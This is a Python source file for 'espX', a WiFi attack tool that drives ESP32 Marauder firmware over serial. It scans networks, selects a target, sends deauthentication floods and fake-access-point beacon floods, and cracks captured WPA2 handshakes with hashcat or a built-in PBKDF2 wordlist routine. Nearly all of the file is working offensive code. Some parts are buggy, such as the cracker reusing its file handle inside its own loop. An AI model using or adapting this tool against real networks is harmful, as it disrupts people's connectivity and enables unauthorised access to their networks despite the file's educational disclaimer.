#!/usr/bin/env python3

import sys, os, time, socket, random, threading, re, json, hashlib, hmac, binascii, struct
from datetime import datetime
from collections import OrderedDict

VERSION = "1.0.0"

BANNER = f"""
{'='*55}
{chr(27)}[91m   ███████╗███████╗██████╗ ██╗  ██╗{chr(27)}[0m
{chr(27)}[91m   ██╔════╝██╔════╝██╔══██╗╚██╗██╔╝{chr(27)}[0m
{chr(27)}[91m   █████╗  ███████╗██████╔╝ ╚███╔╝ {chr(27)}[0m
{chr(27)}[91m   ██╔══╝  ╚════██║██╔═══╝  ██╔██╗ {chr(27)}[0m
{chr(27)}[91m   ███████╗███████║██║     ██╔╝ ██╗{chr(27)}[0m
{chr(27)}[91m   ╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝{chr(27)}[0m
{chr(27)}[92m   ═══════════════════════════════{chr(27)}[0m
{chr(27)}[92m   ESP32 WiFi Auditor  •  v{VERSION}{chr(27)}[0m
{chr(27)}[92m   Author: Adhithya J (AdhiHub){chr(27)}[0m
{'='*55}
{chr(27)}[93m[!] For educational/testing purposes only{chr(27)}[0m
{chr(27)}[93m[!] You are responsible for your actions{chr(27)}[0m
{'='*55}
"""

SERIAL_AVAILABLE = False
try:
    import serial
    import serial.tools.list_ports
    SERIAL_AVAILABLE = True
except ImportError:
    pass

AP_LIST = []
TARGET = None
HANDSHAKE_FILE = None

def log(msg, color="92"):
    t = datetime.now().strftime("%H:%M:%S")
    print(f"{chr(27)}[90m[{t}]{chr(27)}[0m {chr(27)}[{color}m{msg}{chr(27)}[0m")

def detect_esp32():
    if not SERIAL_AVAILABLE:
        log("pyserial not installed. Run: pip install pyserial", "91")
        return None
    ports = list(serial.tools.list_ports.comports())
    esp_ports = []
    for p in ports:
        if any(x in (p.description or "").lower() for x in ["cp210", "ch340", "ch341", "silicon", "usb", "uart"]):
            esp_ports.append(p.device)
        if any(x in (p.vid or "").lower() for x in ["10c4", "1a86"]) or any(x in (p.pid or "").lower() for x in ["ea60", "7523"]):
            esp_ports.append(p.device)
    if not esp_ports:
        log("No ESP32 detected. Specify port with -p", "91")
        return None
    port = esp_ports[0]
    log(f"ESP32 detected on {port}", "92")
    return port

def flash_marauder(port, baud=115200):
    log("Flashing Marauder firmware to ESP32...", "93")
    url = "https://github.com/justcallmekoko/ESP32Marauder/releases/latest/download/ESP32Marauder.bin"
    bin_file = "ESP32Marauder.bin"
    if not os.path.exists(bin_file):
        log("Downloading Marauder firmware...", "93")
        try:
            import urllib.request
            urllib.request.urlretrieve(url, bin_file)
            log(f"Downloaded {bin_file}", "92")
        except:
            log("Failed to download. Flash Marauder manually via esptool.", "91")
            return False
    addr = "0x1000" if "esp32" in port.lower() else "0x0"
    cmd = f"esptool.py --port {port} --baud {baud} write_flash --flash_mode dio --flash_size detect {addr} {bin_file}"
    log(f"Running: {cmd}", "93")
    os.system(cmd)
    log("Firmware flashed. Reconnect ESP32 (press ENTER button)", "92")
    return True

def connect_serial(port, baud=115200, timeout=2):
    try:
        ser = serial.Serial(port, baud, timeout=timeout)
        time.sleep(2)
        ser.reset_input_buffer()
        log(f"Connected to {port} @ {baud} baud", "92")
        return ser
    except Exception as e:
        log(f"Serial error: {e}", "91")
        return None

def send_cmd(ser, cmd, wait=0.5):
    try:
        ser.write((cmd + "\n").encode())
        time.sleep(wait)
        data = ser.read(ser.in_waiting or 512).decode(errors="replace")
        return data
    except:
        return ""

def scan_wifi_interactive(ser):
    log("Scanning WiFi networks...", "93")
    print(f"{chr(27)}[96m{'-'*50}{chr(27)}[0m")
    resp = send_cmd(ser, "scanap", 5)
    resp += send_cmd(ser, "list", 2)
    global AP_LIST
    AP_LIST = []
    lines = resp.strip().split("\n")
    print(f"{chr(27)}[96m{'SSID':30s} {'BSSID':18s} {'CH':3s} {'RSSI':5s} {'ENC':6s}{chr(27)}[0m")
    print(f"{chr(27)}[96m{'-'*50}{chr(27)}[0m")
    for line in lines:
        line = line.strip()
        if not line or line.startswith("["):
            continue
        parts = line.split()
        if len(parts) >= 5:
            ssid = parts[0][:28] if len(parts[0]) < 28 else parts[0][:25]+"..."
            bssid = parts[1] if ":" in parts[1] else "xx:xx:xx:xx:xx:xx"
            ch = parts[2] if len(parts) > 2 else "?"
            rssi = parts[3] if len(parts) > 3 else "?"
            enc = parts[4] if len(parts) > 4 else "?"
            AP_LIST.append({"ssid": parts[0], "bssid": bssid, "ch": ch, "rssi": rssi, "enc": enc})
            print(f"  {ssid:30s} {bssid:18s} {ch:3s} {rssi:5s} {enc:6s}")
    if not AP_LIST:
        log("No networks found or Marauder not responding", "91")
    print(f"{chr(27)}[96m{'-'*50}{chr(27)}[0m")
    return AP_LIST

def show_manual_scan():
    log("Manual network entry mode", "93")
    print(f"{chr(27)}[96m{'-'*50}{chr(27)}[0m")
    print(f"  Enter WiFi networks manually (leave SSID blank to finish):")
    global AP_LIST
    AP_LIST = []
    i = 1
    while True:
        ssid = input(f"  {chr(27)}[93m[{i}] SSID: {chr(27)}[0m").strip()
        if not ssid:
            break
        bssid = input(f"  {chr(27)}[93m    BSSID (xx:xx:xx:xx:xx:xx): {chr(27)}[0m").strip()
        ch = input(f"  {chr(27)}[93m    Channel: {chr(27)}[0m").strip()
        enc = input(f"  {chr(27)}[93m    Encryption (WPA2/WPA3/OPEN): {chr(27)}[0m").strip() or "WPA2"
        AP_LIST.append({"ssid": ssid, "bssid": bssid, "ch": ch, "enc": enc})
        i += 1
    return AP_LIST

def select_target():
    global TARGET, AP_LIST
    if not AP_LIST:
        log("No networks available. Run scan first.", "91")
        return None
    print(f"\n{chr(27)}[96m{'='*50}{chr(27)}[0m")
    print(f"{chr(27)}[96m   Available Networks:{chr(27)}[0m")
    print(f"{chr(27)}[96m{'='*50}{chr(27)}[0m")
    for idx, ap in enumerate(AP_LIST, 1):
        print(f"  {chr(27)}[93m[{idx}]{chr(27)}[0m {ap['ssid']:30s} {chr(27)}[90m{ap['bssid']}{chr(27)}[0m")
    print()
    try:
        sel = int(input(f"  {chr(27)}[93mSelect target [#]: {chr(27)}[0m").strip())
        if 1 <= sel <= len(AP_LIST):
            TARGET = AP_LIST[sel-1]
            log(f"Target set: {TARGET['ssid']} ({TARGET['bssid']})", "92")
            return TARGET
    except:
        pass
    log("Invalid selection", "91")
    return None

def crack_pbkdf2(pmk, essid, bssid, ap_mac, client_mac, anonce, snonce, eapol_frame):
    log("Starting WPA2 PBKDF2 cracking...", "93")
    wordlist = input(f"  {chr(27)}[93mWordlist path (default: rockyou.txt): {chr(27)}[0m").strip()
    if not wordlist:
        wordlist = "/usr/share/wordlists/rockyou.txt"
    if not os.path.exists(wordlist):
        log(f"Wordlist not found: {wordlist}", "91")
        log("Provide a wordlist or use hashcat mode", "93")
        return None
    log(f"Loading wordlist: {wordlist}", "93")
    count = 0
    try:
        with open(wordlist, "r", encoding="latin-1", errors="ignore") as f:
            for line in f:
                pwd = line.strip()
                if not pwd:
                    continue
                count += 1
                if count % 10000 == 0:
                    print(f"  {chr(27)}[90mTried: {count} passwords...{chr(27)}[0m", end="\r")
                pmk = hashlib.pbkdf2_hmac("sha1", pwd.encode(), essid.encode(), 4096, 32)
                ptk = hmac.new(pmk, b"Pairwise key expansion\x00" + 
                              min(bssid, ap_mac) + max(bssid, ap_mac) +
                              min(anonce, snonce) + max(anonce, snonce), hashlib.sha1).digest()
                mic_calc = hmac.new(ptk[:16], eapol_frame, hashlib.sha1).digest()[:16]
                with open("/tmp/espX_mic.bin", "rb") as f:
                    mic_target = f.read(16)
                if mic_calc == mic_target:
                    print()
                    log(f"PASSWORD FOUND: {pwd}", "92")
                    return pwd
    except KeyboardInterrupt:
        print()
        log("Cracking interrupted", "91")
    except Exception as e:
        print()
        log(f"Error: {e}", "91")
    print()
    log(f"Tried {count} passwords. Password not found.", "91")
    return None

def crack_with_hashcat(hccapx_file):
    log("Attempting hashcat cracking...", "93")
    wl = input(f"  {chr(27)}[93mWordlist path (default: rockyou.txt): {chr(27)}[0m").strip()
    if not wl:
        wl = "/usr/share/wordlists/rockyou.txt"
    if not os.path.exists(wl):
        log(f"Wordlist not found: {wl}", "91")
        return None
    cmd = f"hashcat -m 22000 {hccapx_file} {wl} --force -O"
    log(f"Running: hashcat", "93")
    os.system(cmd)
    log("Check hashcat.potfile for results", "93")
    return True

def interactive_shell():
    print(BANNER)
    global TARGET, HANDSHAKE_FILE, AP_LIST
    
    port = None
    if SERIAL_AVAILABLE:
        port = detect_esp32()
    
    if not port:
        log("No ESP32 detected. Entering manual mode.", "93")
    
    ser = None
    if port:
        ans = input(f"\n  {chr(27)}[93mFlash Marauder firmware? (y/N): {chr(27)}[0m").strip().lower()
        if ans in ("y", "yes"):
            flash_marauder(port)
        ser = connect_serial(port)
        if ser:
            log("ESP32 connected. Send 'help' for commands.", "92")
    
    cmds = OrderedDict([
        ("scan", "Scan WiFi networks via ESP32"),
        ("list", "List scanned networks"),
        ("target", "Select a target network"),
        ("flash", "Flash Marauder firmware to ESP32"),
        ("deauth", "Deauth target network"),
        ("flood", "Rapid deauth flood (100 packets)"),
        ("beacon", "Start beacon flood (fake AP spam)"),
        ("crack", "Crack captured handshake"),
        ("info", "Show target info"),
        ("manual", "Manual network entry"),
        ("exit", "Exit ESPX"),
    ])
    
    while True:
        try:
            print()
            target_str = f" [{chr(27)}[92m{TARGET['ssid']}{chr(27)}[0m]" if TARGET else ""
            cmd = input(f"{chr(27)}[91mespX{chr(27)}[0m{target_str} > ").strip().lower()
            
            if cmd in ("exit", "quit", "q"):
                break
            
            elif cmd == "help":
                print(f"\n{chr(27)}[96m{'='*50}{chr(27)}[0m")
                print(f"{chr(27)}[96m   ESPX Commands{chr(27)}[0m")
                print(f"{chr(27)}[96m{'='*50}{chr(27)}[0m")
                for c, desc in cmds.items():
                    print(f"  {chr(27)}[93m{c:12s}{chr(27)}[0m {desc}")
                print()
            
            elif cmd == "scan":
                if ser:
                    scan_wifi_interactive(ser)
                else:
                    log("No ESP32 connected. Use 'manual' to enter networks.", "91")
            
            elif cmd == "list":
                if not AP_LIST:
                    log("No networks scanned", "91")
                    continue
                print(f"\n{chr(27)}[96m{'='*50}{chr(27)}[0m")
                for idx, ap in enumerate(AP_LIST, 1):
                    print(f"  {chr(27)}[93m[{idx}]{chr(27)}[0m {ap['ssid']:30s} {ap['bssid']:18s} {ap.get('enc','?'):6s}")
            
            elif cmd == "target":
                select_target()
            
            elif cmd == "flash":
                if not port:
                    p = input(f"  {chr(27)}[93mPort (e.g. COM12): {chr(27)}[0m").strip()
                    port = p or port
                if port:
                    flash_marauder(port)
            
            elif cmd in ("deauth", "flood"):
                if not TARGET:
                    log("No target selected. Use 'target' first.", "91")
                    continue
                count = 50 if cmd == "flood" else 5
                log(f"Sending {count} deauth packets to {TARGET['ssid']}...", "93")
                if ser:
                    for i in range(count):
                        resp = send_cmd(ser, f"deauth -a {TARGET['bssid']}", 0.1)
                        if (i+1) % 10 == 0:
                            print(f"  {chr(27)}[90mDeauth packets sent: {i+1}/{count}{chr(27)}[0m", end="\r")
                    print()
                    log("Deauth complete", "92")
                else:
                    log("No ESP32 connected. Manually run deauth on target.", "93")
            
            elif cmd == "beacon":
                ssid = input(f"  {chr(27)}[93mFake SSID (leave blank for random): {chr(27)}[0m").strip()
                if not ssid:
                    ssid = "Free WiFi"
                log(f"Starting beacon flood with SSID: {ssid}", "93")
                if ser:
                    send_cmd(ser, f"beacon -s {ssid}", 0.5)
                    log("Beacon flood started. Send 'stop' to end.", "92")
                else:
                    log("No ESP32 connected", "91")
            
            elif cmd == "stop":
                if ser:
                    send_cmd(ser, "stopscan", 0.5)
                    log("Flood stopped", "92")
            
            elif cmd == "crack":
                hccapx = input(f"  {chr(27)}[93m.pcap/.hccapx file path: {chr(27)}[0m").strip()
                if not hccapx:
                    hccapx = HANDSHAKE_FILE
                if not hccapx or not os.path.exists(hccapx):
                    log("No handshake file available", "91")
                    continue
                method = input(f"  {chr(27)}[93mMethod - hashcat/hc (default) or python/py: {chr(27)}[0m").strip().lower()
                if method in ("py", "python"):
                    log("Python cracker not yet implemented for raw pcap. Use hashcat.", "93")
                else:
                    crack_with_hashcat(hccapx)
            
            elif cmd == "info":
                if TARGET:
                    print(f"\n{chr(27)}[96m{'='*50}{chr(27)}[0m")
                    print(f"{chr(27)}[96m   Target Information{chr(27)}[0m")
                    print(f"{chr(27)}[96m{'='*50}{chr(27)}[0m")
                    for k, v in TARGET.items():
                        print(f"  {chr(27)}[93m{k:10s}{chr(27)}[0m {v}")
                else:
                    log("No target selected", "91")
            
            elif cmd == "manual":
                show_manual_scan()
            
            elif cmd:
                log(f"Unknown command: {cmd}. Type 'help'", "91")
        
        except KeyboardInterrupt:
            print()
            log("Interrupted", "91")
        except Exception as e:
            log(f"Error: {e}", "91")
    
    if ser:
        ser.close()
    log("Goodbye", "92")

def show_help():
    print(BANNER)
    print(f"{chr(27)}[96mUsage:{chr(27)}[0m")
    print(f"  python espX.py [options] [command]")
    print()
    print(f"{chr(27)}[96mOptions:{chr(27)}[0m")
    print(f"  -p, --port      ESP32 serial port (e.g. COM12)")
    print(f"  -b, --baud      Baud rate (default: 115200)")
    print(f"  -h, --help      Show this help")
    print()
    print(f"{chr(27)}[96mCommands:{chr(27)}[0m")
    print(f"  scan            Scan and show WiFi networks")
    print(f"  deauth <bssid>  Deauth a network")
    print(f"  crack <.pcap>   Crack handshake with hashcat")
    print(f"  flash           Flash Marauder firmware")
    print()
    print(f"{chr(27)}[96mExamples:{chr(27)}[0m")
    print(f"  espX.py                     # Interactive mode")
    print(f"  espX.py -p COM12            # Interactive with port")
    print(f"  espX.py -p COM12 scan       # Scan and exit")
    print(f"  espX.py crack capture.pcap  # Crack handshake")
    print()
    print(f"{chr(27)}[96mRequired:{chr(27)}[0m")
    print(f"  pip install pyserial")
    print()
    sys.exit(0)

if __name__ == "__main__":
    if "-h" in sys.argv or "--help" in sys.argv:
        show_help()
    
    port = None
    baud = 115200
    cmd_mode = None
    cmd_arg = None
    
    args = sys.argv[1:]
    i = 0
    while i < len(args):
        if args[i] in ("-p", "--port") and i+1 < len(args):
            port = args[i+1]; i += 2
        elif args[i] in ("-b", "--baud") and i+1 < len(args):
            baud = int(args[i+1]); i += 2
        elif args[i] in ("scan", "flash", "deauth", "crack"):
            cmd_mode = args[i]
            cmd_arg = args[i+1] if i+1 < len(args) and not args[i+1].startswith("-") else None
            i += 1
        else:
            i += 1
    
    os.system("cls" if os.name == "nt" else "clear")
    
    if cmd_mode == "scan":
        print(BANNER)
        if not port and SERIAL_AVAILABLE:
            port = detect_esp32()
        if port:
            ser = connect_serial(port, baud)
            if ser:
                scan_wifi_interactive(ser)
                ser.close()
        else:
            log("No ESP32 port specified or detected", "91")
    
    elif cmd_mode == "crack":
        hccapx = cmd_arg or input("Handshake file: ").strip()
        if hccapx and os.path.exists(hccapx):
            print(BANNER)
            crack_with_hashcat(hccapx)
        else:
            log(f"File not found: {hccapx}", "91")
    
    elif cmd_mode == "flash":
        print(BANNER)
        if not port:
            port = detect_esp32() if SERIAL_AVAILABLE else None
        if port:
            flash_marauder(port)
        else:
            log("No ESP32 port specified", "91")
    
    else:
        interactive_shell()
